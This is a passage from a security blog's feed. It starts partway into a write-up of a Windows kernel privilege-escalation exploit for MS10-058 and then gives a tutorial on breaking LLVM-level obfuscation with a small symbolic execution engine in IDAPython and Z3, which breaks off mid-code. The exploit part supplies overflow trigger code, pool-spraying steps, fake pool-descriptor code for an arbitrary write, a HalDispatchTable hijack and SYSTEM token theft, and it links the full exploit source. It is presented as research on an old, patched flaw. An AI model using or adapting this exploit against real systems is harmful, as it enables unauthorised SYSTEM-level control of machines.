IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
</code></p>

<p>You can reach this code using a <em>WSAIoctl</em> with the code <em>SIO_ADDRESS_LIST_SORT</em> using a call like this :</p>

<p><code>text
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
</code>
You have to pass the function a pointer to a <em>SOCKET_ADDRESS_LIST</em> (<em>pwn</em> in the example). This <em>SOCKET_ADDRESS_LIST</em> contains an <em>iAddressCount</em> field and <em>iAddressCount</em> <em>SOCKET_ADDRESS</em> structures. With a high <em>iAddressCount</em> value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations :</p>

<p>```text
IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9</p>

<p>IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
```</p>

<p>The copy will stop if those checks fail. That means that each <em>SOCKET_ADDRESS</em> has a length of 0x1c and that each <em>SOCKADDR</em> buffer pointed to by the socket address begins with a 0x17 byte. Long story short :</p>

<ul>
<li>Make the multiplication at <em>IppSortDestinationAddresses+29</em> overflow</li>
<li>Get a non-paged pool chunk at <em>IppSortDestinationAddresses+3e</em> that is too little</li>
<li>Write user controlled memory to this chunk in <em>IppFlattenAddressList+67</em> and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)</li>
</ul>


<p>The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata.
```text
WSADATA wd = {0};
SOCKET sock = 0;
SOCKET_ADDRESS_LIST <em>pwn = (SOCKET_ADDRESS_LIST</em>)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
DWORD cb;</p>

<p>memset(buffer,0x41,0x1c);
buffer[0] = 0x17;
buffer[1] = 0x00;
sa.lpSockaddr = (LPSOCKADDR)buffer;
sa.iSockaddrLength = 0x1c;
pwn->iAddressCount = 0x40000003;
memcpy(&amp;pwn->Address[0],&amp;sa,sizeof(<em>SOCKET_ADDRESS));
memcpy(&amp;pwn->Address[1],&amp;sa,sizeof(</em>SOCKET_ADDRESS));
memcpy(&amp;pwn->Address[2],&amp;sa,sizeof(<em>SOCKET_ADDRESS));
memcpy(&amp;pwn->Address[3],&amp;sa,sizeof(</em>SOCKET_ADDRESS));</p>

<p>WSAStartup(MAKEWORD(2,0), &amp;wd)
sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
```</p>

<h1>Spraying the pool</h1>

<h2>Non paged objects</h2>

<p>There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.
<code>text
*8516b848 size:   48 previous size:   48  (Allocated) Sema
*85242d08 size:   68 previous size:   68  (Allocated) User
*850fcea8 size:   60 previous size:    8  (Allocated) IoCo
</code></p>

<p>We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call <em>NtAllocateReserveObject</em> with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">[4]</a>.</p>

<p>In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the <em>sprayIoCo()</em> function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.</p>

<h2>nt!PoolHitTag</h2>

<p>If you want to debug a specific call to <em>ExFreePoolWithTag</em> and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags.</p>

<p><code>text
ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
ExFreePoolWithTag(x,x)+639                  shl     eax, 3
ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
</code></p>

<p>As you can see on the listing above, <em>nt!PoolHitTag</em> is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can <em>ed nt!PoolHitTag ‘oooo’</em> to debug your exploit.</p>

<h1>Exploitation technique</h1>

<h2>Basic structure</h2>

<p>As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a <em>_POOL_DESCRIPTOR</em> structure as seen below.
<code>text
0: kd&gt; dt _POOL_TYPE
ntdll!_POOL_TYPE
   NonPagedPool = 0n0
   PagedPool = 0n1
</code>
<code>text
0: kd&gt; dt _POOL_DESCRIPTOR
nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : _POOL_TYPE
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : Uint4B
   +0x040 RunningAllocs    : Int4B
   +0x044 RunningDeAllocs  : Int4B
   +0x048 TotalBigPages    : Int4B
   +0x04c ThreadsProcessingDeferrals : Int4B
   +0x050 TotalBytes       : Uint4B
   +0x080 PoolIndex        : Uint4B
   +0x0c0 TotalPages       : Int4B
   +0x100 PendingFrees     : Ptr32 Ptr32 Void
   +0x104 PendingFreeDepth : Int4B
   +0x140 ListHeads        : [512] _LIST_ENTRY
</code>
A pool descriptor references free memory in a free list called <em>ListHeads</em>. The <em>PendingFrees</em> field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as <em>PoolVector</em> (non-paged) or <em>ExpPagedPoolDescriptor</em> (paged). Each chunk of memory contains a header before the actual data. This is the <em>_POOL_HEADER</em>. It brings information such as the size of the block or the pool it belongs to.</p>

<p><code>text
0: kd&gt; dt _POOL_HEADER
nt!_POOL_HEADER
   +0x000 PreviousSize     : Pos 0, 9 Bits
   +0x000 PoolIndex        : Pos 9, 7 Bits
   +0x002 BlockSize        : Pos 0, 9 Bits
   +0x002 PoolType         : Pos 9, 7 Bits
   +0x000 Ulong1           : Uint4B
   +0x004 PoolTag          : Uint4B
   +0x004 AllocatorBackTraceIndex : Uint2B
   +0x006 PoolTagHash      : Uint2B
</code></p>

<h2>PoolIndex overwrite</h2>

<p>The basic idea of this attack is to corrupt the <em>PoolIndex</em> field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array.</p>

<p><code>text
0: kd&gt; dd ExpPagedPoolDescriptor
82947ae0  84835000 84836140 84837280 848383c0
82947af0  84839500 00000000 00000000 00000000
</code></p>

<p>As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page.</p>

<h2>Non paged pool type</h2>

<p>To determine the <em>_POOL_DESCRIPTOR</em> to use, <em>ExFreePoolWithTag</em> gets the appropriate <em>_POOL_HEADER</em> and stores <em>PoolType</em> (<em>watchMe</em>) and <em>BlockSize</em> (<em>var_3c</em>)</p>

<p><code>text
ExFreePoolWithTag(x,x)+465
ExFreePoolWithTag(x,x)+465  loc_517F01:
ExFreePoolWithTag(x,x)+465  mov     edi, esi
ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
ExFreePoolWithTag(x,x)+471  mov     ebx, eax
ExFreePoolWithTag(x,x)+473  shr     eax, 9
ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
ExFreePoolWithTag(x,x)+47B  and     ebx, esi
ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
ExFreePoolWithTag(x,x)+481  and     eax, 1
ExFreePoolWithTag(x,x)+484  mov     edx, 400h
ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
ExFreePoolWithTag(x,x)+491  test    edx, ecx
ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
</code></p>

<p>Later, if <em>ExpNumberOfNonPagedPools</em> equals 1, the correct pool descriptor will directly be taken from <em>nt!PoolVector[0]</em>. The PoolIndex is not used.</p>

<p>```text
ExFreePoolWithTag(x,x)+5C8  loc_518064:
ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6</p>

<p>ExFreePoolWithTag(x,x)+5E8  loc_518084:
ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB</p>

<p>ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
```</p>

<p>Therefore, you have to make the pool manager believe that the chunk is located in paged memory.</p>

<h2>Crafting a fake pool descriptor</h2>

<p>As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.</p>

<p>When freeing a chunk, if the deferred freelist contains at least 0x20 entries, <em>ExFreePoolWithTag</em> is going to actually free those chunks and put them on the appropriate entries of the <em>ListHeads</em>.</p>

<p>```text</p>

<p><em>(PCHAR</em>)0x100 = (PCHAR)0x1208;
<em>(PCHAR</em>)0x104 = (PCHAR)0x20;
for (i = 0x140; i &lt; 0x1140; i += 8) {</p>

<pre><code>*(PCHAR*)i = (PCHAR)WriteAddress-4;
</code></pre>

<p>}
<em>(PINT)0x1200 = (INT)0x060c0a00;
</em>(PINT)0x1204 = (INT)0x6f6f6f6f;
<em>(PCHAR</em>)0x1208 = (PCHAR)0x0;
<em>(PINT)0x1260 = (INT)0x060c0a0c;
</em>(PINT)0x1264 = (INT)0x6f6f6f6f;
```</p>

<h2>Notes</h2>

<p>It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons :</p>

<ul>
<li>Validation of the <em>PoolIndex</em> field</li>
<li>Prevention of the null page allocation</li>
<li><em>NonPagedPoolNX</em> has been introduced with Windows 8 and should be used instead of the <em>NonPagedPool</em> type.</li>
<li>SMAP would prevent access to userland data</li>
<li>SMEP would prevent execution of userland code</li>
</ul>


<h1>Payload and clean-up</h1>

<p>A classical target for write-what-where scenarios is the <em>HalDispatchTable</em>. We just have to overwrite <em>HalDispatchTable+4</em> with a pointer to our payload which is <em>setupPayload()</em>. When we are done, we just have to put back the pointer to <em>hal!HaliQuerySystemInformation</em>. (otherwise you can expect some crashes)</p>

<p>Now that we are able to execute arbitrary code from kernel land we just have to get the <em>_EPROCESS</em> of the attacking process with <em>PsGetCurrentProcess()</em> and walk the list of processes using the <em>ActiveProcessLinks</em> field until we encounter a process with <em>ImageFileName</em> equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).</p>

<p>This is illustrated in <em>payload()</em>.</p>

<p><img class="center" src="/images/MS10-058/screenshot.png"></p>

<h1>Greetings</h1>

<p>Special thanks to my friend <a href="https://twitter.com/0vercl0k">@0vercl0k</a> for his review and help!</p>

<h1>Conclusion</h1>

<p>I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )</p>

<p>You can find my code on my new github <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">[5]</a>. Don’t hesitate to share comments on my article or my exploit if you see something wrong :)</p>

<h1>References</h1>

<p>[1] <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">Vulnerability details on itsecdb</a></p>

<p>[2] <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">MS bulletin</a></p>

<p>[3] <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">Kernel Pool Exploitation on Windows 7</a> &ndash; Tarjei Mandt&rsquo;s paper. A must-read!</p>

<p>[4] <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">Reserve Objects in Windows 7</a> &ndash; Great j00ru&rsquo;s article!</p>

<p>[5] <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">The code of my exploit for MS10-058</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Breaking Kryptonite's obfuscation: a static analysis approach relying on symbolic execution]]></title>
    <link href="http://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution/"/>
    <updated>2013-09-16T11:47:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p><em>Kryptonite</em> was a proof-of-concept I built to obfuscate codes at the LLVM intermediate representation level. The idea was to use semantic-preserving transformations in order to not break the original program. One of the main idea was for example to build a home-made 32 bits adder to replace the <em>add</em> LLVM instruction. Instead of having a single asm instruction generated at the end of the pipeline, you will end up with a ton of assembly codes doing only an addition. If you never read my article, and you are interested in it here it is: <a href="http://0vercl0k.tuxfamily.org/bl0g/?p=260">Obfuscation of steel: meet my Kryptonite</a>.</p>

<p><img class="center" src="/images/breaking_kryptonite_s_obfuscation_with_symbolic_execution/home-made-adder.png"></p>

<p>In this post I wanted to show you how we can manage to break that obfuscation with symbolic execution. We are going to write a really tiny symbolic execution engine with IDAPy, and we will use Z3Py to simplify all our equations. Note that a friend of mine <a href="https://twitter.com/elvanderb">@elvanderb</a> used a similar approach (more generic though) to simplify some parts of the <a href="http://download.tuxfamily.org/overclokblog/Obfuscation%20of%20steel%3a%20meet%20my%20Kryptonite/binaries/">crackme</a> ; but he didn&rsquo;t wanted to publish it, so here is my blog post about it!</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>The target</h1>

<p>In this blogpost we are first going to work on the LLVM code emitted by <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/llvm-cpp-frontend-home-made-32bits-adder.cpp">llvm-cpp-frontend-home-made-32bits-adder.cpp</a>. Long story short, the code uses the LLVM frontend API to emit a home made 32 bits adder in the <a href="http://llvm.org/docs/LangRef.html">LLVM intermediate language</a>. You can then feed the output directly to clang to generate a real executable binary for your platform, I chose to work only on the x86 platform here. I&rsquo;ve also uploaded the binary here: <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/adder">adder</a>.</p>

<p>So if you open the generated binary in IDA, you will see an interminable routine that only does an addition. At first glance, it really is kind of scary:</p>

<ul>
<li>every instructions seems to be important, there is no junk codes</li>
<li>it seems that only binary operations are used: addition, left shift, right shift, xor, etc.</li>
<li>it&rsquo;s also a two thousands instructions routine</li>
</ul>


<p>The idea in this post is to write a very basic symbolic execution engine in order to see what kind of result will hold the EAX register at the end of the routine. Hopefully, we will obtain something highly simplified and more readable that this bunch of assembly codes!</p>

<h1>The symbolic execution engine approach</h1>

<p>But in fact that piece of code makes it <strong>really</strong> easy for us to write a symbolic execution engine. Here are the main reasons:</p>

<ul>
<li>there is no branches, no loops, perfect.</li>
<li>the instruction aren&rsquo;t playing with the <a href="https://en.wikipedia.org/wiki/FLAGS_register">EFLAGS</a> register.</li>
<li>the instruction only used 32 bits registers (not 16 bits, or 8 bits).</li>
<li>the number of unique instruction is really small: <em>mov</em>, <em>shr</em>, <em>shl</em>, <em>xor</em>, <em>and</em>, <em>xor</em>, <em>add</em>.</li>
<li>the instructions used are easy to emulate.</li>
</ul>


<p>Understand that here, we are really in a specific case, the engine wouldn&rsquo;t be that easy to implement to cover the most used x86 instructions ; but we are lucky, we won&rsquo;t need that!</p>

<p>The engine is in fact a pseudo-emulator that propagates the different actions done by the asm instructions. Here is how our engine works:</p>

<ol>
<li>Each time a symbolic variable is found, you instantiate a Z3 BitVector and you keep it somewhere. A symbolic variable is basically a variable that the attacker can control. For example, in our case, we will have two symbolic variables: the two arguments passed to the function. We will see later an easy heuristic to find &ldquo;automatically&rdquo; the symbolic variables in our case.</li>
<li>When you have an instruction, you emulate it and you update the CPU state of the engine. If it involves an equation, you update your set of equations.</li>
<li>You do that until the end of the routine.</li>
</ol>


<p>Of course, when the engine has been successfully executed, you may want to ask it some questions like &ldquo;what does hold the EAX register at the end of the routine?&rdquo;. You want to have exactly all the operations needed to compute EAX. In our case, we hope to obtain &ldquo;<em>symbolic_variable1</em> + <em>symbolic_variable2</em>&rdquo;.</p>

<p>Here is a little example to sum up what we just said:
```nasm
mov eax, [arg1]  ; at this moment we have our first symbolic variable</p>

<pre><code>             ; we push it in our equations list
</code></pre>

<p>mov edx, [arg2]  ; same thing here</p>

<p>shr eax, 2   ; EAX=sym1 >> 2
add eax, 1   ; EAX=(sym1 >> 2) + 1
shl eax, 3   ; EAX=((sym1 >> 2) + 1) &lt;&lt; 1
and eax, 2   ; EAX=(((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2
inc edx      ; EDX=sym2 + 1
xor edx, eax ; EDX=(sym2 + 1) ^ ((((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2)
mov eax, edx ; EAX=(sym2 + 1) ^ ((((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2)
```</p>

<p>So at the end, you can ask the engine to give you the final state of EAX for example and it should give you something like:
<code>text
EAX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)
</code></p>

<p>With that equation you are free to use Z3Py to either simplify it or to try to find how you can have a specific value in EAX controlling only the symbolic variables:</p>

<p>```text
In [1]: from z3 import *
In [2]: sym1 = BitVec(&lsquo;sym1&rsquo;, 32)
In [3]: sym2 = BitVec(&lsquo;sym2&rsquo;, 32)</p>

<p>In [4]: simplify((sym2 + 1) ^ ((((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2))
Out[4]: 1 + sym2 ^ Concat(0, 1 + Extract(0, 0, sym1 >> 2), 0)</p>

<p>In [5]: solve((sym2 + 1) ^ ((((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2) == 0xdeadbeef)
[sym1 = 0, sym2 = 3735928556]</p>

<p>In [6]: solve((sym2 + 1) ^ ((((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2) == 0xdeadbeef, sym1 !=  0)
[sym1 = 1073741824, sym2 = 3735928556]</p>

<p>In [7]: sym1 = 1073741824
In [8]: sym2 = 3735928556</p>

<p>In [9]: hex((sym2 + 1) ^ ((((sym1 >> 2) + 1) &lt;&lt; 1) &amp; 2) &amp; 0xffffffff)
Out[9]: &lsquo;0xdeadbeefL&rsquo;
```</p>

<p>As you can imagine, that kind of tool is very valuable/handy when you do reverse-engineering tasks or bug-hunting. Unfortunately, our PoC won&rsquo;t be enough accurate/generic/complete to be used in &ldquo;normal&rdquo; cases, but never mind.</p>

<h1>Let&rsquo;s code</h1>

<p>To implement our little PoC we will use only <a href="https://code.google.com/p/idapython/">IDAPython</a> and <a href="http://rise4fun.com/z3py/">Z3Py</a>.</p>

<h2>The disassembler</h2>

<p>The first thing we have to do is to use IDA&rsquo;s API in order to have some inspection information about assembly instructions. The idea is just to have the mnemonic, the source and the destination operands easily ; here is the class I&rsquo;ve designed toward that purpose:</p>

<p>```python Disassembler class
class Disassembler(object):</p>

<pre><code>'''A simple class to decode easily instruction in IDA'''
def __init__(self, start, end):
    self.start = start
    self.end = end
    self.eip = start

def _decode_instr(self):
    '''Returns mnemonic, dst, src'''
    mnem = GetMnem(self.eip)
    x = []
    for i in range(2):
        ty = GetOpType(self.eip, i)
        # cst
        if 5 &lt;= ty &lt;= 7:
            x.append(GetOperandValue(self.eip, i))
        else:
            x.append(GetOpnd(self.eip, i))

    return [mnem] + x

def get_next_instruction(self):
    '''This is a convenient generator, you can iterator through
    each instructions easily'''
    while self.eip != self.end:
        yield self._decode_instr()
        self.eip += ItemSize(self.eip)
</code></pre>

<p>```</p>

<h2>The symbolic execution engine</h2>

<p>There are several important parts in our engine:</p>

<ol>
<li>the part which &ldquo;emulates&rdquo; the assembly instruction.</li>
<li>the part which stores the different equations used through the routine. It is a simple Python dictionary: the key is a unique identifier, and the value is the equation</li>
<li>the CPU state. We also use a dictionary for that purpose: the key will be the register names, and the value will be what the register holds at that specific moment. Note we will only store the unique identifier of the equation. In fact, our design is really similar to Jonathan&rsquo;s one in &ldquo;<a href="http://shell-storm.org/blog/Binary-analysis-Concolic-execution-with-Pin-and-z3/">Binary analysis: Concolic execution with Pin and z3</a>&rdquo;, so please refer you to his cool pictures if it&rsquo;s not really clear :P.</li>
<li>the memory state ; in that dictionary we store memory references. Remember, if we find a non-initialized access to a memory area we instantiate a symbolic variable. That is our heuristic to find the symbolic variables automatically.</li>
</ol>


<p>Here is the PoC code:</p>

<p>```python SymbolicExecutionEngine class
def prove(f):</p>

<pre><code>'''Taken from http://rise4fun.com/Z3Py/tutorialcontent/guide#h26'''
s = Solver()
s.add(Not(f))
if s.check() == unsat:
    return True
return False
</code></pre>

<p>class SymbolicExecutionEngine(object):</p>

<pre><code>'''The symbolic execution engine is the class that will
handle the symbolic execution. It will keep a track of the 
different equations encountered, and the CPU context at each point of the program.

The symbolic variables have to be found by the user (or using data-taing). This is not
the purpose of this class.

We are lucky, we only need to handle those operations &amp; encodings:
    . mov:
        . mov reg32, reg32
        . mov reg32, [mem]
        . mov [mem], reg32
    . shr:
        . shr reg32, cst
    . shl:
        . shl reg32, cst
    . and:
        . and reg32, cst
        . and reg32, reg32
    . xor:
        . xor reg32, cst
    . or:
        . or reg32, reg32
    . add:
        . add reg32, reg32

We also don't care about:
    . EFLAGS
    . branches
    . smaller registers (16/8 bits)
Long story short: it's perfect ; that environment makes really easy to play with symbolic execution.'''
def __init__(self, start, end):
    # This is the CPU context at each time
    # The value of the registers are index in the equations dictionnary
    self.ctx = {
        'eax' : None,
        'ebx' : None,
        'ecx' : None,
        'edx' : None,
        'esi' : None,
        'edi' : None,
        'ebp' : None,
        'esp' : None,
        'eip' : None
    }

    # The address where the symbolic execution will start
    self.start = start

    # The address where the symbolic execution will stop
    self.end = end

    # Our disassembler
    self.disass = Disassembler(start, end)

    # This is the memory that can be used by the instructions to save temporary values/results
    self.mem = {}

    # Each equation must have a unique id
    self.idx = 0

    # The symbolic variables will be stored there
    self.sym_variables = []

    # Each equation will be stored here
    self.equations = {}

def _check_if_reg32(self, r):
    '''XXX: make a decorator?'''
    return r.lower() in self.ctx

def _push_equation(self, e):
    self.equations[self.idx] = e
    self.idx += 1
    return (self.idx - 1)

def set_reg_with_equation(self, r, e):
    if self._check_if_reg32(r) == False:
        return

    self.ctx[r] = self._push_equation(e)

def get_reg_equation(self, r):
    if self._check_if_reg32(r) == False:
        return

    return self.equations[self.ctx[r]]

def run(self):
    '''Run from start address to end address the engine'''
    for mnemonic, dst, src in self.disass.get_next_instruction():
        if mnemonic == 'mov':
            # mov reg32, reg32
            if src in self.ctx and dst in self.ctx:
                self.ctx[dst] = self.ctx[src]
            # mov reg32, [mem]
            elif (src.find('var_') != -1 or src.find('arg') != -1) and dst in self.ctx:
                if src not in self.mem:
                    # A non-initialized location is trying to be read, we got a symbolic variable!
                    sym = BitVec('arg%d' % len(self.sym_variables), 32)
                    self.sym_variables.append(sym)
                    print 'Trying to read a non-initialized area, we got a new symbolic variable: %s' % sym
                    self.mem[src] = self._push_equation(sym)

                self.ctx[dst] = self.mem[src]
            # mov [mem], reg32
            elif dst.find('var_') != -1 and src in self.ctx:
                if dst not in self.mem:
                    self.mem[dst] = None

                self.mem[dst] = self.ctx[src]
            else:
                raise Exception('This encoding of "mov" is not handled.')
        elif mnemonic == 'shr':
            # shr reg32, cst
            if dst in self.ctx and type(src) == int:
                self.set_reg_with_equation(dst, LShR(self.get_reg_equation(dst), src))
            else:
                raise Exception('This encoding of "shr" is not handled.')
        elif mnemonic == 'shl':
            # shl reg32, cst
            if dst in self.ctx and type(src) == int:
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) &lt;&lt; src)
            else:
                raise Exception('This encoding of "shl" is not handled.')
        elif mnemonic == 'and':
            x = None
            # and reg32, cst
            if type(src) == int:
                x = src
            # and reg32, reg32
            elif src in self.ctx:
                x = self.get_reg_equation(src)
            else:
                raise Exception('This encoding of "and" is not handled.')

            self.set_reg_with_equation(dst, self.get_reg_equation(dst) &amp; x)
        elif mnemonic == 'xor':
            # xor reg32, cst
            if dst in self.ctx and type(src) == int:
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) ^ src)
            else:
                raise Exception('This encoding of "xor" is not handled.')
        elif mnemonic == 'or':
            # or reg32, reg32
            if dst in self.ctx and src in self.ctx:
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) | self.get_reg_equation(src))
            else:
                raise Exception('This encoding of "or" is not handled.')
        elif mnemonic == 'add':
            # add reg32, reg32
            if dst in self.ctx and src in self.ctx:
                self.set_reg_with_equation(dst, self.get_reg_equation(dst) + self.get_reg_equation(src))
            else:
                raise Exception('This encoding of "add" is not handled.')
        else:
            print mnemonic, dst, src
            raise Exception('This instruction is not handled.')

def get_reg_equation_simplified(self, reg):
    eq = self.get_reg_equation(reg)
    eq = simplify(eq)
    return eq
</code></pre>

<p>```</p>

<h2>Testing</h2>

<p>OK, we just have to instantiate the engine giving him the start/end address of the routine and to ask him to give us the final equation holded in EAX.</p>

<p>```python main
def main():</p>

<pre><code>'''Here we will try to attack the semantic-preserving obfuscations
I talked about in "Obfuscation of steel: meet my Kryptonite." : http://0vercl0k.tuxfamily.org/bl0g/?p=260.

The idea is to defeat those obfuscations using a tiny symbolic execution engine.'''
sym = SymbolicExecutionEngine(0x804845A, 0x0804A17C)
print 'Launching the engine..'
sym.run()
print 'Done, retrieving the equation in EAX, and simplifying..'
eax = sym.get_reg_equation_simplified('eax')
print 'EAX=%r' % eax
return 1
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>main()
</code></pre>

<p>```</p>

<p>And here is what I saw:</p>

<p>```text
Launching the engine..
Trying to read a non-initialized area, we got a new symbolic variable: arg0
Trying to read a non-initialized area, we got a new symbolic variable: arg1
Done, retrieving the equation in EAX, and simplifying..
EAX=(~(Concat(2147483647, Extract(0, 0, arg1)) |
   Concat(2147483647, ~Extract(0, 0, arg0)) |
   4294967294) |
 ~(Concat(2147483647, ~Extract(0, 0, arg1)) |
   Concat(2147483647, Extract(0, 0, arg0)) |
   4294967294)) +
Concat(~(Concat(1073741823, Extract(1, 1, arg1)) |</p>

<pre><code>     Concat(1073741823, ~Extract(1, 1, arg0)) |
     Concat(1073741823,
            ~(~Extract(0, 0, arg1) |
              ~Extract(0, 0, arg0)))) |
   ~(Concat(1073741823, ~Extract(1, 1, arg1)) |
     Concat(1073741823, Extract(1, 1, arg0)) |
     Concat(1073741823,
            ~(~Extract(0, 0, arg1) |
              ~Extract(0, 0, arg0)))) |
   ~(Concat(1073741823, Extract(1, 1, arg1)) |
     Concat(1073741823, Extract(1, 1, arg0)) |
     Concat(1073741823, ~Extract(0, 0, arg1)) |
     Concat(1073741823, ~Extract(0, 0, arg0)) |
     2147483646) |
   ~(Concat(1073741823, ~Extract(1, 1, arg1)) |
     Concat(1073741823, ~Extract(1, 1, arg0)) |
     Concat(1073741823, ~Extract(0, 0, arg1)) |
     Concat(1073741823, ~Extract(0, 0, arg0)) |
     2147483646),
   0) +
</code></pre>

<p>&hellip;
```</p>

<p>There was two possible explanations for this problem:</p>

<ul>
<li>my code is wrong, and it generates equations not simplify-able.</li>
<li>my code is right, and Z3Py&rsquo;s simplify method has a hard time to simplify it.</li>
</ul>


<p> To know what was the right answer, I used Z3Py&rsquo;s prove function in order to know if the equation was equivalent to a simple addition:</p>

<p>```python main
 def main():</p>

<pre><code>'''Here we will try to attack the semantic-preserving obfuscations
I talked about in "Obfuscation of steel: meet my Kryptonite." : http://0vercl0k.tuxfamily.org/bl0g/?p=260.

The idea is to defeat those obfuscations using a tiny symbolic execution engine.'''
